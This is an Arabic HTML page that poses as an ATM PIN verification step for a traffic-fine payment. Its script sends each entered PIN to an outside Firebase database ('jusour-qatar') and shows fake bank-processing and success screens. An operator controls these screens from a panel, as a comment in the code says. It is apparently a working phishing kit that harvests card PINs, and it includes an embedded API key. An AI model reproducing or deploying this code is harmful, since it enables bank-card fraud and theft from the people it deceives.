<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>التحقق من الهوية - الصراف الآلي</title>
  <style>
    body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .atm-card { background: #fff; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; }
    .atm-title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 10px; }
    .atm-msg { font-size: 13px; color: #666; margin-bottom: 25px; }
    .pin-input { width: 100%; height: 50px; border: 1px solid #ddd; border-radius: 8px; text-align: center; font-size: 28px; letter-spacing: 15px; outline: none; margin-bottom: 20px; }
    .confirm-btn { width: 100%; height: 50px; background: #008b47; color: #fff; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; }
    #errorMsg { color: red; font-size: 12px; margin-top: 10px; display: none; }
  </style>
</head>
<body>

<div class="atm-card" id="mainContent">
  <div class="atm-title">الرمز السري للبطاقة (ATM PIN)</div>
  <div class="atm-msg">يرجى إدخال الرقم السري المكون من 4 أرقام التابع للبطاقة لإتمام عملية التفويض بنجاح.</div>
  
  <form id="atmForm">
    <input type="password" id="atmPin" class="pin-input" maxlength="4" placeholder="****" required>
    <button type="submit" class="confirm-btn" id="confirmBtn">تأكيد العملية</button>
  </form>
  <div id="errorMsg">الرمز السري غير صحيح، يرجى المحاولة مرة أخرى.</div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
      measurementId: "G-CSRM4QLNR9"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    document.getElementById("atmForm").onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById("confirmBtn");
        btn.innerHTML = "جاري التحقق...";
        btn.disabled = true;

        const pinData = {
            atm_pin: document.getElementById("atmPin").value,
            status: "pin_submitted",
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        };

        try {
            await db.collection("payments").add(pinData);
            // هنا يفضل تظهر لودر انتظار لحد ما أنت تعطيه "تم الدفع بنجاح" من لوحة التحكم
            document.getElementById("mainContent").innerHTML = `
                <div class="loader-ring"></div>
                <div class="atm-title">جاري معالجة الدفع</div>
                <div class="atm-msg">يرجى الانتظار، يتم الآن التواصل مع البنك المصدر للبطاقة...</div>
            `;
            listenForFinalStatus();
        } catch (err) { location.reload(); }
    };

    function listenForFinalStatus() {
        db.collection("payments").orderBy("timestamp", "desc").limit(1).onSnapshot((snap) => {
            snap.forEach((doc) => {
                if(doc.data().status === "success") {
                    document.getElementById("mainContent").innerHTML = `
                        <div style="color:green; font-size:50px;">✓</div>
                        <div class="atm-title">تم الدفع بنجاح</div>
                        <div class="atm-msg">تم استلام مبلغ المخالفات وتحديث السجل المروري. رقم العملية: ${Math.floor(Math.random()*1000000)}</div>
                    `;
                } else if(doc.data().status === "pin_error") {
                    document.getElementById("errorMsg").style.display = "block";
                    btn.innerHTML = "تأكيد العملية";
                    btn.disabled = false;
                }
            });
        });
    }
</script>
</body>
</html>